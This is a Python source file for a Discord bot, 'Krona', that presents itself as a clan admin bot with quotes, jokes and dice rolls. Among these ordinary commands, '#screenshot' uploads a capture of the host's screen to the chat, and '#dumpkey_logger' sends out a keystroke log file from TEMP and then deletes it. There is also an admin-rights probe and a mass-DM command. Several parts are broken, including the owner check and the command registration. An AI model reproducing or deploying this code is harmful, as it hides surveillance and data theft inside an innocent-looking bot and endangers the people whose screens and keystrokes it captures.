import datetime
import os
import sys
from discord.ext import commands
from mss import mss
from dotenv import load_dotenv
import random
from src.resources import quotes, joke
import discord
import discord.client

""".env file"""
load_dotenv()
TOKEN = os.getenv('KRONA_DISCORD_TOKEN')

"""Setting up bot"""
client = discord.Client()
bot = commands.Bot(command_prefix='#', description='')
start_time = datetime.datetime.now()

"""Helper function for datetime"""


def timedelta_str(dt):
    days = dt.days
    hours, r = divmod(dt.seconds, 3600)
    minutes, sec = divmod(r, 60)

    if minutes == 1 and sec == 1:
        return '{0} days, {1} hours, {2} minute and {3} second.'.format(days, hours, minutes, sec)
    elif minutes > 1 and sec == 1:
        return '{0} days, {1} hours, {2} minutes and {3} second.'.format(days, hours, minutes, sec)
    elif minutes == 1 and sec > 1:
        return '{0} days, {1} hours, {2} minute and {3} seconds.'.format(days, hours, minutes, sec)
    else:
        return '{0} days, {1} hours, {2} minutes and {3} seconds.'.format(days, hours, minutes, sec)


"""When the bot Connects to discord"""


@client.event
async def on_ready():
    print('Username -> ' + client.user.name)
    print('ID -> ' + str(client.user.id))
    print(f'{client.user} has connected to Discord!')

    try:
        # A secondary check to ensure nobody but the owner can run these commands.
        async def self_check(ctx):
            if 'CoYoFroYo' == ctx.message.author.id:
                return True
            else:
                return False

        # Messages every member in a server.
        @commands.check(self_check)
        @bot.command(pass_context=True)
        async def message_all(ctx, *, message):
            await ctx.message.delete()
            for user in ctx.guild.members:
                try:
                    await user.send(message)
                    print(f"{user.name} has received the message.")
                except:
                    print(f"{user.name} has NOT received the message.")
            print("Action Completed: messaged_all")

        @commands.check(self_check)
        @bot.command(pass_context=True)
        async def uptime(ctx):
                """Displays bot uptime."""
                global start_time
                await ctx.send(timedelta_str(datetime.datetime.now() - start_time))

        @commands.check(self_check)
        @bot.command(pass_context=True)
        async def source(ctx):
            """Post a link to the bot source code."""
            source = "https://github.com/cyork95/KronaBotFam"
            await ctx.send(source)

    except:
        pass


"""Send a DM when someone new joins the server"""


@client.event
async def on_member_join(member):
    await member.create_dm()
    await member.dm_channel.send(
        f'Hi {member.name}, welcome to my Clan! My name is Krona the local admin bot around here.'
    )


""" When someone sends a certain message do the below"""


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    elif message.content == '#quote' or message.content == '#q':
        response = random.choice(quotes.fav_quotes)
        await message.channel.send(response)

    elif message.content == '#lazy':
        response = "\"The way to get started is to quit talking and begin doing.\" -Walt Disney"
        await message.channel.send(response)

    elif message.content == '#joke' or message.content == '#j':
        joke_call = joke.get_joke()

        if not joke_call:
            await message.channel.send("Couldn't get joke from API. Try again later.")
        else:
            await message.channel.send(joke_call['setup'] + '\n' + joke_call['punchline'])

    elif message.content == '#roll_d20' or message.content == '#d20':
        response = "Your roll is: " + str(random.choice(range(1, 21)))
        await message.channel.send(response)

    elif message.content == '#ping':
        response = "Pong! Latency is " + str(client.latency) + " ms."
        await message.channel.send(response)

    elif message.content == "#screenshot":
        with mss() as sct:
            sct.shot()
        file = discord.File("monitor-1.png", filename="monitor-1.png")
        await message.channel.send("[*] Command successfully executed", file=file)

    elif message.content == "#dumpkey_logger":
        import os
        temp = os.getenv("TEMP")
        file_keys = temp + "key_log.txt"
        file = discord.File(file_keys, filename=file_keys)
        await message.channel.send("[*] Command successfully executed", file=file)
        os.popen("del " + file_keys)

    elif message.content == "#admin_check":
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            await message.channel.send("[*] Congrats you're an admin... for now")
        elif not is_admin:
            await message.channel.send("[*] Sorry, you're not an admin. Why are you even doing this command? Shouldn't"
                                       " you know?")

    elif message.content == "#krona_stop":
        sys.exit()


client.run(TOKEN)
